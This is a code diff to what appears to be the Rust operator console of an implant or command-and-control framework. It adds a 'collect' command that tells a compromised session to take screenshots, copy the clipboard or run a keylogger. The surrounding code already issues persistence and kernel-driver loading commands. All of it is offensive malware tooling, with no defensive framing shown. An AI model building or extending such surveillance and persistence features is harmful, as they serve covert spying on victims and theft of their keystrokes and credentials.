@@ -134,6 +134,9 @@ impl App {
                         .into(),
                 );
                 self.push_log(
+                    "  collect <id> <screenshot|clipboard|keylog>      collection (T031)".into(),
+                );
+                self.push_log(
                     "  driver <id> load <svc> <src> <dst>   stage+start kernel driver (ABR-T013)"
                         .into(),
                 );
@@ -205,6 +208,11 @@ impl App {
                     "cmd": "persist", "session": id, "action": action,
                     "mechanism": mechanism, "name": name, "args": args,
                 }))
+            }
+            Some("collect") if tokens.len() >= 3 => {
+                // collect <id> <screenshot|clipboard|keylog>
+                let id: u32 = tokens[1].parse().unwrap_or(0);
+                Some(json!({ "cmd": "collect", "session": id, "action": tokens[2] }))
             }
             Some("psrun") if tokens.len() >= 3 => {
                 let id: u32 = tokens[1].parse().unwrap_or(0);
